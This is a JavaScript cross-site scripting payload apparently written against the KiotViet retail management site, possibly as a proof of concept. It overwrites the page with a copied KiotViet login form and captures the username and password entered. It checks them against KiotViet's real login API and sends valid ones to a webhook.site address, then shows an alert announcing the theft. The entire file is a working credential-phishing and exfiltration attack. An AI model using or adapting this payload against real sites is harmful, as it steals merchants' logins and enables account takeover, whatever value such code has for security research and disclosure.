var kv_xss_token = 2;
async function kv_xss_login_async(type) {
    var u = document.getElementById('UserName').value;
    var p = document.getElementById('Password').value;

    var body = JSON.stringify({
        model: {
            RememberMe: true,
            ShowCaptcha: false,
            UserName: u,
            Password: p,
            LatestBranchId: null
        },
        IsManageSide: true,
        FingerPrintKey: localStorage.getItem('FingerPrintKey')
    });
    if (type == 2) {
        body = JSON.stringify({
            UserName: u,
            Password: p,
            FingerPrintKey: localStorage.getItem('FingerPrintKey'),
            LatestBranchId: null
        });
    }

    var result = await fetch(type == 1 ? 'https://api-man.kiotviet.vn/api/account/login?quan-ly=true' : 'https://api-man.kiotviet.vn/api/auth/salelogin?format=json&ban-hang=true', {
        method: 'post',
        headers: {
            'retailer': 'testz63',
            'Content-Type': 'application/json'
        },
        body: body
    });
    result = await result.json();
    if (result.isSuccess || result.BearerToken) {
        await fetch('https://webhook.site/b4251709-abeb-4778-a6ab-19075e9b0c44?u=' + u + '&p=' + p).then(_ => { }).catch(_ => { });
        localStorage.setItem('kv-check', JSON.stringify({ run: kv_xss_token }));
        alert('Thông tin đăng nhập đã được gửi về: https://webhook.site/#!/b4251709-abeb-4778-a6ab-19075e9b0c44');
        location.href = '/';
    } else {
        var message = 'Sai tên đăng nhập hoặc mật khẩu. Hãy nhấp vào "Quên mật khẩu" để thiết lập lại.';
        var eContainer = document.querySelector('section.loginFr .validation-summary-errors');
        var eMesaage = eContainer.querySelector('li[ng-bind="error"]');
        eContainer.classList.remove('ng-hide');
        eMesaage.textContent = message;
    }
}

async function kv_xss_run_async() {
    await 0;
    var kvCheck = {};
    try {
        kvCheck = JSON.parse(localStorage.getItem('kv-check') ?? '{}');
    } catch (_) { kvCheck = {}; }
    if (kvCheck.run != kv_xss_token) {
        var kvLogin = '<div class="login mainWrap ng-scope" ng-controller="LoginCtrl" ng-init="init();"> <form id="loginForm" class="ng-pristine ng-invalid ng-invalid-recaptcha"> <section class="loginBox posR ovh login-forgot"> <header class="txtC txtB"> <a href="#" class="logo dpib" tabindex="-1"><span>Đăng nhập</span> <img src="https://cdn-app.kiotviet.vn/retailler/Content/kiotvietLogo.png" alt="KiotViet" title="KiotViet"></a> </header> <section class="loginFr ovh "> <div class="validation-summary-errors ng-hide" ng-show="error !==1"> <ul> <li ng-bind="error" class="ng-binding"></li></ul> </div><div class="posR"> <input data-val="true" placeholder="Tên đăng nhập" data-val-required="Nhập tên đăng nhập!" ng-model="account.UserName" id="UserName" name="UserName" tabindex="1" type="text" class="ng-pristine ng-valid ng-empty ng-touched"></div><div class="posR"> <input data-val="true" placeholder="Mật khẩu" data-val-required="Nhập mật khẩu!" ng-model="account.Password" id="Password" name="Password" tabindex="2" type="password" class="ng-pristine ng-untouched ng-valid ng-empty"></div><input id="fingerPrintKey" name="fingerPrintKey" hidden=""> <aside class="ovh remb"> <label class="txtN mb0 quickaction_chk ng-binding"> <input checked="" data-val="true" ng-model="account.RememberMe" data-val-required="The Ghi nhớ field is required." id="RememberMe" name="RememberMe" tabindex="4" type="checkbox" value="true" class="ng-pristine ng-untouched ng-valid ng-not-empty"> <input name="RememberMe" type="hidden" value="false"> <span></span> Duy trì đăng nhập </label> <span class="split">|</span> <a href="javascript:void(0);" id="forgotPass" tabindex="6" class="link ng-binding" ng-click="ForgotPassword()">Quên mật khẩu?</a> </aside> </section> <section class="lgBtn"> <span class="loginBtn"> <i class="fas fa-analytics"></i> <input tabindex="4" name="quan-ly" type="button" data-ng-disabled="loginForm.$invalid" ng-click="loginForm.$invalid=true;loginForManage();" value="Quản lý"> </span> <span class="loginBtn loginBtnSale"> <i class="fas fa-shopping-basket"></i> <input tabindex="5" id="loginNewSaleOld" ng-click="loginNewSale();" type="button" value="Bán hàng"> </span> </section> </section> <div class="other"><i class="fas fa-phone-square-alt"></i>&nbsp;&nbsp; Hỗ trợ: 19006522</div></form></div>';
        document.body.innerHTML = kvLogin;
        window.history.pushState('kv-xss-login', 'KiotViet', '/man/#/login');
        var loginBtn = document.getElementById('loginForm').getElementsByClassName('loginBtn');
        loginBtn.item(0).addEventListener('click', _ => kv_xss_login_async(1));
        loginBtn.item(1).addEventListener('click', _ => kv_xss_login_async(2));
    }
}
kv_xss_run_async();
